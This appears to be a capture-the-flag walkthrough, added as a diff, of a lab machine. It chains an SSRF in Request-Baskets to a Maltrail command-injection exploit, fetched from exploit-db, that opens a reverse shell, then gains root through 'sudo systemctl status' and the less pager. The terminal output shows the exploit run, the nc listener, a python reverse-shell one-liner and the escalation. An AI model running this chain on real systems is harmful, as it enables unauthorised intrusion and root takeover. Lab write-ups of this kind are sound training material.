@@ -1,0 +1,140 @@
+
+
+
+http site on 10.10.11.224:55555
+
+ Powered by request-baskets | Version: 1.2.1
+https://github.com/entr0pie/CVE-2023-27163
+PoC of SSRF on Request-Baskets (CVE-2023-27163)
+
+
+we enter http://127.0.0.1:80 into the forward url for a basket.
+remove web from the url
+
+we find a page with footer
+
+Powered by Maltrail (v0.53)
+https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# curl -s https://www.exploit-db.com/download/51676 > exploit_51676.py
+                                                                              
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 exploit_51676.py 10.10.14.16 4444 http://10.10.11.224:55555/b0whhmp         
+Running exploit on http://10.10.11.224:55555/b0whhmp/login
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.224] 36278
+$ 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# stty raw -echo ; fg ; reset                              
+[1]  + continued  nc -lvnp 4444
+                               stty columns 117 rows 22
+puma@sau:/opt/maltrail$ cd /home
+puma@sau:/home$ ls -la
+total 12
+drwxr-xr-x  3 root root 4096 Apr 15  2023 .
+drwxr-xr-x 20 root root 4096 Jun 19  2023 ..
+drwxr-xr-x  4 puma puma 4096 Jun 19  2023 puma
+puma@sau:/home$ cd puma
+puma@sau:~$ ls -la
+total 32
+drwxr-xr-x 4 puma puma 4096 Jun 19  2023 .
+drwxr-xr-x 3 root root 4096 Apr 15  2023 ..
+lrwxrwxrwx 1 root root    9 Apr 14  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 puma puma  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 puma puma 3771 Feb 25  2020 .bashrc
+drwx------ 2 puma puma 4096 Apr 15  2023 .cache
+drwx------ 3 puma puma 4096 Apr 15  2023 .gnupg
+-rw-r--r-- 1 puma puma  807 Feb 25  2020 .profile
+lrwxrwxrwx 1 puma puma    9 Apr 15  2023 .viminfo -> /dev/null
+lrwxrwxrwx 1 puma puma    9 Apr 15  2023 .wget-hsts -> /dev/null
+-rw-r----- 1 root puma   33 Aug 26 04:33 user.txt
+puma@sau:~$ cat user.txt
+...
+puma@sau:~$ sudo -l
+Matching Defaults entries for puma on sau:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+puma@sau:~$ 
+
+
+puma@sau:~$ sudo /usr/bin/systemctl status trail.service
+● trail.service - Maltrail. Server of malicious traffic detection system
+     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset: enabled)
+     Active: active (running) since Tue 2025-08-26 04:33:37 UTC; 32min ago
+       Docs: https://github.com/stamparm/maltrail#readme
+             https://github.com/stamparm/maltrail/wiki
+   Main PID: 881 (python3)
+      Tasks: 12 (limit: 4662)
+     Memory: 29.0M
+     CGroup: /system.slice/trail.service
+             ├─ 881 /usr/bin/python3 server.py
+             ├─1017 /bin/sh -c logger -p auth.info -t "maltrail[881]" "Failed password for ;`echo "cHl0aG9uMyAtYyAna>
+             ├─1018 /bin/sh -c logger -p auth.info -t "maltrail[881]" "Failed password for ;`echo "cHl0aG9uMyAtYyAna>
+             ├─1022 sh
+             ├─1027 python3 -c import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1>
+             ├─1028 /bin/sh
+             ├─1032 python3 -c import pty; pty.spawn("/bin/bash")
+             ├─1033 /bin/bash
+             ├─1052 sudo /usr/bin/systemctl status trail.service
+             ├─1054 /usr/bin/systemctl status trail.service
+             └─1055 pager
+
+Aug 26 04:33:37 sau systemd[1]: Started Maltrail. Server of malicious traffic detection system.
+Aug 26 05:04:11 sau sudo[1047]:     puma : TTY=pts/1 ; PWD=/home/puma ; USER=root ; COMMAND=list
+Aug 26 05:06:29 sau sudo[1052]:     puma : TTY=pts/1 ; PWD=/home/puma ; USER=root ; COMMAND=/usr/bin/systemctl statu>
+Aug 26 05:06:29 sau sudo[1052]: pam_unix(sudo:session): session opened for user root by (uid=0)
+puma@sau:~$ 
+
+puma@sau:~$ systemctl --version
+systemd 245 (245.4-4ubuntu3.22)
++PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2 -IDN +PCRE2 default-hierarchy=hybrid
+puma@sau:~$ 
+
+CVE-2023-26604
+
+"systemd before 247 does not adequately block local privilege escalation for some Sudo configurations, e.g., plausible sudoers files in which the "systemctl status" command may be executed. Specifically, systemd does not set LESSSECURE to 1, and thus other programs may be launched from the less program. This presents a substantial security risk when running systemctl from Sudo, because less executes as root when the terminal size is too small to show the complete systemctl output."
+
+puma@sau:~$ sudo /usr/bin/systemctl status trail.service
+● trail.service - Maltrail. Server of malicious traffic detection system
+     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset: enabled)
+     Active: active (running) since Tue 2025-08-26 04:33:37 UTC; 36min ago
+       Docs: https://github.com/stamparm/maltrail#readme
+             https://github.com/stamparm/maltrail/wiki
+   Main PID: 881 (python3)
+      Tasks: 12 (limit: 4662)
+     Memory: 33.1M
+     CGroup: /system.slice/trail.service
+             ├─ 881 /usr/bin/python3 server.py
+             ├─1017 /bin/sh -c logger -p auth.info -t "maltrail[881]" "Failed password for ;`echo "cHl0aG9uMyAtYyAna>
+             ├─1018 /bin/sh -c logger -p auth.info -t "maltrail[881]" "Failed password for ;`echo "cHl0aG9uMyAtYyAna>
+             ├─1022 sh
+             ├─1027 python3 -c import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1>
+             ├─1028 /bin/sh
+             ├─1032 python3 -c import pty; pty.spawn("/bin/bash")
+             ├─1033 /bin/bash
+             ├─1057 sudo /usr/bin/systemctl status trail.service
+             ├─1058 /usr/bin/systemctl status trail.service
+             └─1059 pager
+
+!sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+...
+# 
+
+
+
+
+
